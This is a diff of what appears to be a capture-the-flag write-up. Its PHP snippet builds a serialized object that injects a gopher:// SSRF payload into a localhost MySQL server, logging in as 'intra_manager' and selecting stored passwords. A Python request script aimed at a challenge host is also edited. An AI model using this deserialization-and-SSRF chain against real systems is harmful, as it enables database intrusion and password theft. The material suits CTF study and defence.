@@ -232,33 +232,17 @@ array(1) {
 error_reporting(0);
 # made by munsiwoo
 
-class ReportModule
-{
-    public $target;
-    public function __construct($tg) { $this->target = $tg; }
-    public function send_report() {}
-    private function send_real() {}
-}
+class ReportModule { public $target; }
+class LogModule { public $filename, $rpt_module; }
 
+$rpt_module = new ReportModule();
+$rpt_module->target = 'gopher://localhost:3306/_%a7%00%00%01%85%a2%1e%00%00%00%00%40%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%69%6e%74%72%61%5f%6d%61%6e%61%67%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%61%03%5f%6f%73%09%64%65%62%69%61%6e%36%2e%30%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%32%33%34%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%08%35%2e%36%2e%36%2d%6d%39%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%03%66%6f%6f%03%62%61%72%35%00%00%00%03%73%65%6c%65%63%74%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%76%61%6c%75%65%29%20%66%72%6f%6d%20%69%6e%74%72%61%5f%64%61%74%61%2e%70%61%73%73%77%6f%72%64%3b%01%00%00%00%01';
 
-class LogModule {
-    public $filename, $rpt_module;
-
-    function __construct($name) { $this->filename = "log/$name"; }
-        public function set_rpt_module($custom_module) {
-            if(!method_exists($custom_module, "send_report"))
-                return false;
-        $this->rpt_module = $custom_module;
-        return true;
-    }
-}
-
-$report_module = new ReportModule('gopher://localhost:3306/_%a7%00%00%01%85%a2%1e%00%00%00%00%40%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%69%6e%74%72%61%5f%6d%61%6e%61%67%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%61%03%5f%6f%73%09%64%65%62%69%61%6e%36%2e%30%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%32%33%34%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%08%35%2e%36%2e%36%2d%6d%39%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%03%66%6f%6f%03%62%61%72%35%00%00%00%03%73%65%6c%65%63%74%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%76%61%6c%75%65%29%20%66%72%6f%6d%20%69%6e%74%72%61%5f%64%61%74%61%2e%70%61%73%73%77%6f%72%64%3b%01%00%00%00%01');
-$log_module = new LogModule('munsiwoo123');
-$log_module->rpt_module = $report_module;
+$log_module = new LogModule();
+$log_module->filename = 'log/munsiwoo123';
+$log_module->rpt_module = $rpt_module;
 
 echo '|'.str_replace('"', '\\\\"', serialize($log_module));
-
 
 ```
 
@@ -287,7 +271,6 @@ if __name__ == '__main__' :
         "Connection": "keep-alive",
         "Pragma": "no-cache",
         "Cache-Control": "no-cache",
-        "Origin": "http://httpd.shop",
         "Upgrade-Insecure-Requests": "1",
         "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryUmsB8xWbmldnarAQ",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
